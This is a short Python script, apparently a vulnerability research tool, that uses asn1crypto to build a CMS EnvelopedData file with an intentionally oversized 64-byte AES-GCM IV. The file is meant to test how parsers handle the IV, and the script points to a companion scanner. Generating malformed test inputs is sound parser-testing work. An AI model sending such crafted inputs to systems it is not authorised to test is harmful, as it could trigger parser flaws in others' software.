#!/usr/bin/env python3
"""
CYBERDUDEBIVASH® CMS IV Research Tool
generate-malformed-cms.py

Purpose:
Generate a VALID CMS EnvelopedData structure containing an
INTENTIONALLY OVERSIZED AES-GCM IV (64 bytes) to test CMS IV
parsing vulnerabilities.

This version is ASN.1-STRICT and compatible with asn1crypto.
"""

import os
from asn1crypto import cms, algos
from asn1crypto.core import OctetString

# ---------------------------------------------------------
# Configuration
# ---------------------------------------------------------

OUTPUT_FILE = "malformed-enveloped-oversized-iv.cms"
IV_SIZE = 64  # Normal AES-GCM IV = 12 bytes

# ---------------------------------------------------------
# Generate oversized IV
# ---------------------------------------------------------

iv = os.urandom(IV_SIZE)

# ---------------------------------------------------------
# Build EncryptionAlgorithm (VERSION-SAFE)
# ---------------------------------------------------------

content_encryption_algorithm = algos.EncryptionAlgorithm({
    'algorithm': 'aes256_gcm',
    'parameters': OctetString(iv)  # ASN.1 ANY → must be Asn1Value
})

# ---------------------------------------------------------
# Build EncryptedContentInfo
# ---------------------------------------------------------

encrypted_ci = cms.EncryptedContentInfo()
encrypted_ci['content_type'] = 'data'
encrypted_ci['content_encryption_algorithm'] = content_encryption_algorithm
encrypted_ci['encrypted_content'] = OctetString(
    b'CYBERDUDEBIVASH-CMS-IV-TEST'
)

# ---------------------------------------------------------
# Build EnvelopedData
# ---------------------------------------------------------

env_data = cms.EnvelopedData()
env_data['version'] = 0
env_data['recipient_infos'] = []  # Empty OK for parser testing
env_data['encrypted_content_info'] = encrypted_ci

# ---------------------------------------------------------
# Wrap in ContentInfo (CRITICAL FIX HERE)
# ---------------------------------------------------------

content_info = cms.ContentInfo()
content_info['content_type'] = 'enveloped_data'  # ✅ CORRECT NAME
content_info['content'] = env_data

# ---------------------------------------------------------
# Write output
# ---------------------------------------------------------

with open(OUTPUT_FILE, "wb") as f:
    f.write(content_info.dump())

print(f"[+] Generated: {OUTPUT_FILE}")
print(f"    CMS Type  : EnvelopedData")
print(f"    Algorithm: AES-256-GCM")
print(f"    IV length: {IV_SIZE} bytes (OVERSIZED)")
print()
print("Scan using:")
print(f"python cyberdudebivash-cms-iv-scanner.py {OUTPUT_FILE}")
